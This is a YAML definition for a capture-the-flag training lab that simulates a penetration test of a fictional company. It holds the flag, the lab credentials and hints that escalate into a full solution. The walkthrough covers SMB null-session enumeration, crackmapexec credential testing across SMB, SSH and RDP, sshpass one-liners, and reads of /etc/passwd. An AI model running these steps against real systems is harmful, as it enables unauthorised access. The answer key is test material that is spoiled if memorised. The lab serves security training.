@@ -1,0 +1,454 @@
+name: Complete Windows Penetration Test
+description: Final phase of your FinanceCorp engagement. Combine all techniques learned to perform a complete penetration test, demonstrating the full attack chain from initial access to data exfiltration.
+difficulty: intermediate
+category: assessment
+duration_minutes: 120
+objectives:
+  - full penetration test with all techniques
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  You're completing the final phase of your penetration test for FinanceCorp. James 
+  Mitchell has requested a comprehensive demonstration that combines all techniques 
+  you've learned: reconnaissance, enumeration, credential attacks, lateral movement, 
+  and exploitation.
+  
+  This final exercise will demonstrate the complete attack chain from initial network 
+  discovery through service enumeration, credential discovery, lateral movement, and 
+  final system compromise. FinanceCorp needs to see the full attack path to understand 
+  the security risks and prioritize remediation efforts.
+  
+  Your objective: Execute a complete Windows penetration test against FinanceCorp's 
+  infrastructure. From initial reconnaissance to final system access, demonstrate the 
+  full attack chain and document all findings. This comprehensive report will conclude 
+  your engagement and provide FinanceCorp with actionable security recommendations.
+
+flag: "OCR{c0mpl3t3_w1nd0ws_p3nt3st}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding a Complete Windows Penetration Test
+
+      A **penetration test (pentest)** is a comprehensive, authorized security
+      assessment that simulates real-world attacks against a target system or
+      network. This lab represents the capstone exercise - combining every
+      technique you have learned into a single, structured engagement.
+
+      ### Penetration Testing Methodology
+
+      Professional pentests follow a structured methodology:
+
+      ```
+      Phase 1: Reconnaissance      --> Passive & active information gathering
+      Phase 2: Enumeration          --> Detailed service & user enumeration
+      Phase 3: Vulnerability ID     --> Identify misconfigurations & weaknesses
+      Phase 4: Exploitation         --> Leverage vulnerabilities for access
+      Phase 5: Post-Exploitation    --> Escalate privileges, move laterally
+      Phase 6: Reporting            --> Document findings & recommendations
+      ```
+
+      ### Services and Configuration
+
+      | Service | Port | Key Details |
+      |---------|------|-------------|
+      | SMB | 445 | Guest access on IPC$, authenticated "private" share |
+      | RDP | 3389 | Authenticated access |
+      | SSH | 22 | Authenticated access |
+
+      ### Special Configuration: "map to guest = Bad User"
+
+      This SMB server has `map to guest = Bad User` configured. This means:
+      - Invalid usernames are **mapped to the guest account** instead of rejected
+      - This allows **null session enumeration** via IPC$
+      - Attackers can enumerate users, shares, and policies without credentials
+      - Valid usernames prompt for authentication normally
+
+      ### Your Goal
+
+      Execute a complete penetration test from reconnaissance through
+      post-exploitation, demonstrating the full attack chain.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Tools for a Complete Penetration Test
+
+      ### Install the Full Toolkit
+      ```bash
+      sudo apt install nmap smbclient crackmapexec freerdp2-x11 \
+        openssh-client enum4linux smbmap ldap-utils
+      ```
+
+      ### Phase 1: Reconnaissance Tools
+
+      **nmap - Network Scanner:**
+      ```bash
+      # Service detection with scripts
+      nmap -sV -sC -p 22,445,3389 <target>
+
+      # Aggressive scan
+      nmap -A -p 22,445,3389 <target>
+
+      # SMB-specific NSE scripts
+      nmap --script smb-enum-shares,smb-enum-users -p 445 <target>
+      nmap --script smb-os-discovery -p 445 <target>
+      ```
+
+      ### Phase 2: Enumeration Tools
+
+      **enum4linux - SMB/NetBIOS Enumeration:**
+      ```bash
+      enum4linux -a <target>
+      ```
+
+      **smbmap - Share Mapping:**
+      ```bash
+      smbmap -H <target>
+      smbmap -H <target> -u admin -p password123
+      ```
+
+      **smbclient - Share Interaction:**
+      ```bash
+      smbclient -L //<target> -N
+      smbclient -L //<target> -U admin%password123
+      ```
+
+      ### Phase 3-4: Exploitation Tools
+
+      **crackmapexec - Multi-Protocol Testing:**
+      ```bash
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec ssh <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      **xfreerdp / ssh - Access Tools:**
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      ssh admin@<target>
+      ```
+
+      ### Key Strategy
+
+      Start with null session enumeration (no credentials) to discover
+      usernames and shares, then test credentials across all services.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Penetration Test Examples
+
+      ### Phase 1: Reconnaissance
+      ```bash
+      nmap -sV -sC -p 22,445,3389 <target>
+      ```
+
+      Expected output:
+      ```
+      PORT     STATE SERVICE       VERSION
+      22/tcp   open  ssh           OpenSSH 8.x
+      445/tcp  open  netbios-ssn   Samba smbd 4.x
+      3389/tcp open  ms-wbt-server xrdp
+      ```
+
+      ### Phase 2: Null Session Enumeration
+
+      Because of `map to guest = Bad User`, null sessions work:
+      ```bash
+      # Enumerate with null session
+      enum4linux -a <target>
+      ```
+
+      This reveals:
+      - Available shares (IPC$, private)
+      - User accounts
+      - Password policies
+      - OS information
+
+      ```bash
+      # List shares anonymously
+      smbclient -L //<target> -N
+      ```
+
+      Expected output:
+      ```
+      Sharename       Type      Comment
+      ---------       ----      -------
+      private         Disk
+      IPC$            IPC       IPC Service
+      ```
+
+      ```bash
+      # NSE scripts for user enumeration
+      nmap --script smb-enum-users -p 445 <target>
+      nmap --script smb-enum-shares -p 445 <target>
+      ```
+
+      ### Phase 3: Vulnerability Identification
+
+      Key findings from enumeration:
+      - **Null session access** enabled (map to guest = Bad User)
+      - **IPC$ accessible** without credentials
+      - **User accounts** discoverable through enumeration
+      - **Private share** requires authentication
+
+      ### Key Insight
+
+      The null session enumeration reveals usernames. Combined with common
+      password testing, this provides the full credential chain. The username
+      `admin` with password `password123` is the target credential.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Complete Penetration Test Workflow
+
+      ### Phase 1: Reconnaissance
+      ```bash
+      # Service scan
+      nmap -sV -sC -p 22,445,3389 <target>
+
+      # SMB-specific scripts
+      nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 <target>
+      ```
+
+      ### Phase 2: Enumeration (Null Session)
+      ```bash
+      # Comprehensive null session enumeration
+      enum4linux -a <target>
+
+      # List shares anonymously
+      smbclient -L //<target> -N
+
+      # Check anonymous share permissions
+      smbmap -H <target>
+
+      # Try accessing IPC$ (null session)
+      smbclient //<target>/IPC$ -N
+      ```
+
+      ### Phase 3: Credential Testing
+      ```bash
+      # Test admin:password123 on all services
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec ssh <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      ### Phase 4: Exploitation
+      ```bash
+      # Access SMB shares with credentials
+      smbclient -L //<target> -U admin%password123
+      smbclient //<target>/private -U admin%password123
+      smb: \> ls
+      smb: \> exit
+
+      # SSH access
+      ssh admin@<target>
+      # Password: password123
+      ```
+
+      ### Phase 5: Post-Exploitation
+      ```bash
+      # Once connected via SSH, gather information
+      whoami
+      id
+      uname -a
+      ls -la /tmp/
+      cat /tmp/private/flag.txt
+
+      # Check for other interesting files
+      find / -name "*.txt" 2>/dev/null
+      find / -name "*.conf" 2>/dev/null
+      cat /etc/passwd
+      ```
+
+      ### Phase 6: Documentation
+
+      Document the complete attack chain:
+      1. Null session enumeration revealed users and shares
+      2. Credential testing confirmed admin:password123 on all services
+      3. SSH access provided full system compromise
+      4. Flag retrieved from /tmp/private/flag.txt
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands to Solve This Lab
+
+      ### 1. Reconnaissance Scan
+      ```bash
+      nmap -sV -sC -p 22,445,3389 <target>
+      ```
+
+      ### 2. Null Session Enumeration
+      ```bash
+      enum4linux -a <target>
+      smbclient -L //<target> -N
+      ```
+
+      ### 3. Test Credentials on All Services
+      ```bash
+      crackmapexec smb <target> -u admin -p password123
+      crackmapexec ssh <target> -u admin -p password123
+      crackmapexec rdp <target> -u admin -p password123
+      ```
+
+      ### 4. Enumerate SMB Shares (Authenticated)
+      ```bash
+      smbclient -L //<target> -U admin%password123
+      crackmapexec smb <target> -u admin -p password123 --shares
+      ```
+
+      ### 5. Connect via SSH and Read the Flag
+      ```bash
+      ssh admin@<target>
+      ```
+      Password: `password123`
+
+      Once connected:
+      ```bash
+      cat /tmp/private/flag.txt
+      ```
+
+      ### Alternative: CrackMapExec Command Execution
+      ```bash
+      crackmapexec ssh <target> -u admin -p password123 -x "cat /tmp/private/flag.txt"
+      ```
+
+      ### Alternative: One-Shot SSH
+      ```bash
+      sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target> "cat /tmp/private/flag.txt"
+      ```
+
+      ### Alternative: Via SMB Share
+      ```bash
+      smbclient //<target>/private -U admin%password123 -c "ls"
+      # If flag is in the share:
+      smbclient //<target>/private -U admin%password123 -c "more flag.txt"
+      ```
+
+      ### Alternative: Via RDP
+      ```bash
+      xfreerdp /v:<target> /u:admin /p:password123 /cert:ignore
+      # Open terminal, run: cat /tmp/private/flag.txt
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Full Penetration Test Sequence
+
+      ```bash
+      # === PHASE 1: RECONNAISSANCE ===
+
+      nmap -sV -sC -p 22,445,3389 <target>
+      # Output:
+      #   22/tcp   open  ssh           OpenSSH 8.x
+      #   445/tcp  open  netbios-ssn   Samba smbd 4.x
+      #   3389/tcp open  ms-wbt-server xrdp
+
+      # === PHASE 2: ENUMERATION (NULL SESSION) ===
+
+      # Anonymous share listing
+      smbclient -L //<target> -N
+      # Output:
+      #   Sharename       Type      Comment
+      #   ---------       ----      -------
+      #   private         Disk
+      #   IPC$            IPC       IPC Service
+
+      # Full null session enumeration
+      enum4linux -a <target>
+      # Output: Users, shares, password policy, OS info
+
+      # === PHASE 3: CREDENTIAL TESTING ===
+
+      crackmapexec smb <target> -u admin -p password123
+      # Output: SMB  <target>  445  [+] admin:password123
+
+      crackmapexec ssh <target> -u admin -p password123
+      # Output: SSH  <target>  22   [+] admin:password123
+
+      crackmapexec rdp <target> -u admin -p password123
+      # Output: RDP  <target>  3389 [+] admin:password123
+
+      # === PHASE 4: EXPLOITATION ===
+
+      # Access SMB shares
+      crackmapexec smb <target> -u admin -p password123 --shares
+      # Output: private  READ,WRITE
+
+      # SSH access for flag
+      ssh admin@<target>
+      # Password: password123
+
+      # === PHASE 5: POST-EXPLOITATION ===
+
+      cat /tmp/private/flag.txt
+      # Output: OCR{...}
+      ```
+
+      ### Complete Attack Chain
+
+      ```
+      Null Session Enum  --> Discovered users, shares, "map to guest" config
+           |
+      Credential Test    --> admin:password123 works on SMB, SSH, RDP
+           |
+      SSH Exploitation   --> Full command-line access
+           |
+      Post-Exploitation  --> Retrieved flag from /tmp/private/flag.txt
+      ```
+
+      ### Pentest Findings Summary
+
+      | # | Finding | Severity | Evidence |
+      |---|---------|----------|----------|
+      | 1 | Null session enumeration | High | `map to guest = Bad User` |
+      | 2 | User enumeration via IPC$ | Medium | enum4linux reveals users |
+      | 3 | Weak credentials | Critical | admin:password123 |
+      | 4 | Credential reuse | Critical | Same creds on SMB/SSH/RDP |
+      | 5 | Sensitive data exposure | High | Flag in /tmp/private/flag.txt |
+
+      ### Key Takeaways
+
+      - This lab demonstrates the complete penetration testing methodology
+      - Null session enumeration (Phase 2) was possible due to the
+        `map to guest = Bad User` misconfiguration
+      - The same weak credentials worked across all three services
+      - SSH provided the most direct path to flag retrieval
+      - In a real engagement, each finding would be documented with
+        severity ratings and remediation recommendations
+      - Submit the flag value in the format `OCR{...}`
+
+credentials:
+  - username: "admin"
+    password: "password123"
+    role: "admin"
+    description: "admin credentials"
+
+workbook: "wiki/range/winpt/CH09_Assessment/03_Complete_Windows_Penetration_Test/"
+
+test:
+  steps:
+    - name: "Verify SMB, RDP, and SSH services are running"
+      command: "nmap -sV -p 22,445,3389 {target.target}"
+      expect: "22/tcp"
+
+    - name: "Verify null session enumeration works (map to guest)"
+      command: "crackmapexec smb {target.target} -u '' -p '' 2>&1"
+      expect: "445"
+
+    - name: "Verify SMB credentials with crackmapexec"
+      command: "crackmapexec smb {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
+      expect: "+"
+
+    - name: "Retrieve flag via SSH credential reuse"
+      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target} 'cat /tmp/private/flag.txt' 2>/dev/null"
+      expect: "OCR{c0mpl3t3_w1nd0ws_p3nt3st}"
